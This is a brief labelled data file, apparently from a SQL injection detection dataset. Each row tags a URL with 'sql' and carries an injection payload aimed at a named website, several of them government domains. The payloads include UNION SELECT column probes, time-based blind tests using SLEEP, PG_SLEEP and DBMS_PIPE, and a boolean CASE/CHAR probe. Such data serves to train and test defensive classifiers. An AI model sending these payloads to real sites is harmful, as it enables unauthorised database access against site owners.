1,sql,http : / / www . romanianwriters . ro / s . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL - - vGXN
2,sql,http : / / www . bible - history . com / subcat . php ? id = 1;SELECT PG_SLEEP ( 5 ) - - 
3,sql,http : / / ruscongrmech2015 . ru / index . php ? id = 1 ' ) AND SLEEP ( 5 ) AND ( ' GJyr ' = ' GJyr
4,sql,http : / / berkeleyrecycling . org / page . php ? id = 1 ' ) AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( ' VgiB ' = ' VgiB
5,sql,http : / / www . xrayrisk . com / calculator / calculator - normal - studies . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL - - Lunn
6,sql,http : / / 193 . 232 . 218 . 56 / web - local / prep / rj / index . php ? id = 1 % ' AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ' % ' = ' 
8,sql,https : / / www . fleurlis . com . tw / en / wedding . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - IshX
9,sql,http : / / www . dipintoguitars . com / category . php ? id = 1 ) UNION ALL SELECT NULL - - fqfI
10,sql,http : / / www . teamgear . us / store . php ? id = 1 ) UNION ALL SELECT NULL , NULL - - EXrh
11,sql,http : / / www . multan . gov . pk / files . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc
12,sql,http : / / www . asfaa . org / members . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY
13,sql,http : / / www . bpc . gov . bd / contactus . php ? id = 1 ORDER BY 4721 - - gPsZ
